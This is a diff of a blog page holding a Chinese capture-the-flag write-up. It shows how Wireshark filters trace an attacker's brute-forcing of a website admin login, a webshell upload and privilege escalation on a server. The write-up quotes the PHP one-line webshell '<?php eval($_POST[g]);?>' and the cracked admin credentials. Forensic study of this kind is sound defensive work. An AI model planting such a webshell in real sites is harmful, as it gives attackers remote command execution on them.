@@ -8,13 +8,13 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>wiresahrk流量分析（一）——渗透企业网站后台 | yhbl&#39;note</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="今天在准备铁三比赛，实战了一道流量分析题，题目背景是黑客拿到了企业一台服务器的权限，然后进行了内网渗透。题目内容：黑客拿到一台服务器的权限，之后进行了内网渗透1.被攻击的服务器的内网地址 172.16.60.1992.被攻击的服务器的外网地址 118.194.196.2323.攻击者的ip地址  202.99.27.1944.爆破出的后台地址  http://202.99.27.194/simpl">
+  <meta name="description" content="今天在准备铁三比赛，实战了一道流量分析题，题目背景是黑客拿到了企业一台服务器的权限，然后进行了内网渗透。">
 <meta name="keywords" content="wireshark,流量分析">
 <meta property="og:type" content="article">
 <meta property="og:title" content="wiresahrk流量分析（一）——渗透企业网站后台">
 <meta property="og:url" content="http://yoursite.com/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/index.html">
 <meta property="og:site_name" content="yhbl&#39;note">
-<meta property="og:description" content="今天在准备铁三比赛，实战了一道流量分析题，题目背景是黑客拿到了企业一台服务器的权限，然后进行了内网渗透。题目内容：黑客拿到一台服务器的权限，之后进行了内网渗透1.被攻击的服务器的内网地址 172.16.60.1992.被攻击的服务器的外网地址 118.194.196.2323.攻击者的ip地址  202.99.27.1944.爆破出的后台地址  http://202.99.27.194/simpl">
+<meta property="og:description" content="今天在准备铁三比赛，实战了一道流量分析题，题目背景是黑客拿到了企业一台服务器的权限，然后进行了内网渗透。">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/1.png">
 <meta property="og:image" content="http://yoursite.com/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/2.png">
@@ -28,10 +28,10 @@
 <meta property="og:image" content="http://yoursite.com/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/10.png">
 <meta property="og:image" content="http://yoursite.com/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/11.png">
 <meta property="og:image" content="http://yoursite.com/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/12.png">
-<meta property="og:updated_time" content="2018-05-23T16:22:48.965Z">
+<meta property="og:updated_time" content="2018-05-23T16:26:35.682Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="wiresahrk流量分析（一）——渗透企业网站后台">
-<meta name="twitter:description" content="今天在准备铁三比赛，实战了一道流量分析题，题目背景是黑客拿到了企业一台服务器的权限，然后进行了内网渗透。题目内容：黑客拿到一台服务器的权限，之后进行了内网渗透1.被攻击的服务器的内网地址 172.16.60.1992.被攻击的服务器的外网地址 118.194.196.2323.攻击者的ip地址  202.99.27.1944.爆破出的后台地址  http://202.99.27.194/simpl">
+<meta name="twitter:description" content="今天在准备铁三比赛，实战了一道流量分析题，题目背景是黑客拿到了企业一台服务器的权限，然后进行了内网渗透。">
 <meta name="twitter:image" content="http://yoursite.com/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/1.png">
   
     <link rel="alternative" href="/atom.xml" title="yhbl&#39;note" type="application/atom+xml">
@@ -186,7 +186,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>今天在准备铁三比赛，实战了一道流量分析题，题目背景是黑客拿到了企业一台服务器的权限，然后进行了内网渗透。<br>题目内容：<br><br><br>黑客拿到一台服务器的权限，之后进行了内网渗透<br>1.被攻击的服务器的内网地址 172.16.60.199<br>2.被攻击的服务器的外网地址 118.194.196.232<br>3.攻击者的ip地址  202.99.27.194<br>4.爆破出的后台地址  <a href="http://202.99.27.194/simplexue/login.php" target="_blank" rel="noopener">http://202.99.27.194/simplexue/login.php</a><br>5.爆破出的后台登录用户名和密码 “admin” “admin123”<br>6.webshell的完整路径 C:\phpStudy\WWW\dedecms\uploads\jian.php<br>7.被攻击服务器的主机名 SIMPLE-W7LOIJIF<br>8.被攻击服务器的网站根目录 C:\phpStudy\WWW\dedecms<br>9.黑客获得的权限 administrators<br><br><br>首先分析题黑客拿到了一台服务器权限，猜测利用的是web服务，查看日志信息也可以发现外网地址202.99.27.194对服务器的大量http请求。<br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/1.png"><br>然后过滤使用过滤语句 “http and ip.addr == 202.99.27.194”过滤数据包发现了大量的404请求（黑客进行了网站页面爆破）。然后通过统计中的http—&gt;负载分配查看网站的外网地址，这样前三题就解出来了。<br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/2.png"><br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/3.png"><br>然后继续分析，黑客对后台进行了爆破，简单，直接过滤HTTP的post请求就ok了。使用过滤语句”http.request.method==POST and ip.addr == 202.99.27.194”过滤第二个包发现了黑客进行爆破的数据包。如下图所示：<br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/4.png"><br>根据经验最后一个登陆请求为登陆成功的账户与密码，也可以追踪一下tcp流验证一下。<br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/5.png"><br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/6.png"><br>这样后台密码和后台地址就解出来了。<br>接下来就需要找到黑客上传的webshell，根据上传webshell的方式为POST请求，同样利用过滤语句”http.request.method==POST and ip.addr == 202.99.27.194”进行过滤。<br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/7.png"><br>如图所示黑客写入了一句话木马 “&lt;?php eval($_POST[g]);? &gt; 然后利用利用菜刀链接。根据菜刀的链接原理，我跟可以继续分析余下的post包的内容来查看黑客具体做了什么操作。<br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/8.png"><br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/9.png"><br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/10.png"><br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/11.png"><br>可以看出黑客查看了PHPinfo（）；以及建立了用户test并且把权限提升到了管理员权限。<br>通过追踪phpinfo数据包的HTTP流可以查看的PHPinfo的页面信息（在PHP info页面上又主机名信息）。ps:目前不了解为什么追踪tcp流不能追踪到页面流量。<br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/12.png"><br>最后所有的题都解决了，后面还有好多数据包没有分析，是关于内网渗透的数据包，我会继续更新的。</p>
+        <p>今天在准备铁三比赛，实战了一道流量分析题，题目背景是黑客拿到了企业一台服务器的权限，然后进行了内网渗透。<br><a id="more"></a><br>题目内容：<br><br><br>黑客拿到一台服务器的权限，之后进行了内网渗透<br>1.被攻击的服务器的内网地址 172.16.60.199<br>2.被攻击的服务器的外网地址 118.194.196.232<br>3.攻击者的ip地址  202.99.27.194<br>4.爆破出的后台地址  <a href="http://202.99.27.194/simplexue/login.php" target="_blank" rel="noopener">http://202.99.27.194/simplexue/login.php</a><br>5.爆破出的后台登录用户名和密码 “admin” “admin123”<br>6.webshell的完整路径 C:\phpStudy\WWW\dedecms\uploads\jian.php<br>7.被攻击服务器的主机名 SIMPLE-W7LOIJIF<br>8.被攻击服务器的网站根目录 C:\phpStudy\WWW\dedecms<br>9.黑客获得的权限 administrators<br><br><br>首先分析题黑客拿到了一台服务器权限，猜测利用的是web服务，查看日志信息也可以发现外网地址202.99.27.194对服务器的大量http请求。<br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/1.png"><br>然后过滤使用过滤语句 “http and ip.addr == 202.99.27.194”过滤数据包发现了大量的404请求（黑客进行了网站页面爆破）。然后通过统计中的http—&gt;负载分配查看网站的外网地址，这样前三题就解出来了。<br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/2.png"><br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/3.png"><br>然后继续分析，黑客对后台进行了爆破，简单，直接过滤HTTP的post请求就ok了。使用过滤语句”http.request.method==POST and ip.addr == 202.99.27.194”过滤第二个包发现了黑客进行爆破的数据包。如下图所示：<br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/4.png"><br>根据经验最后一个登陆请求为登陆成功的账户与密码，也可以追踪一下tcp流验证一下。<br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/5.png"><br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/6.png"><br>这样后台密码和后台地址就解出来了。<br>接下来就需要找到黑客上传的webshell，根据上传webshell的方式为POST请求，同样利用过滤语句”http.request.method==POST and ip.addr == 202.99.27.194”进行过滤。<br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/7.png"><br>如图所示黑客写入了一句话木马 “&lt;?php eval($_POST[g]);? &gt; 然后利用利用菜刀链接。根据菜刀的链接原理，我跟可以继续分析余下的post包的内容来查看黑客具体做了什么操作。<br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/8.png"><br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/9.png"><br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/10.png"><br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/11.png"><br>可以看出黑客查看了PHPinfo（）；以及建立了用户test并且把权限提升到了管理员权限。<br>通过追踪phpinfo数据包的HTTP流可以查看的PHPinfo的页面信息（在PHP info页面上又主机名信息）。ps:目前不了解为什么追踪tcp流不能追踪到页面流量。<br><img src="/2018/05/23/wiresahrk流量分析（一）——渗透企业网站后台/12.png"><br>最后所有的题都解决了，后面还有好多数据包没有分析，是关于内网渗透的数据包，我会继续更新的。</p>
 
       
 
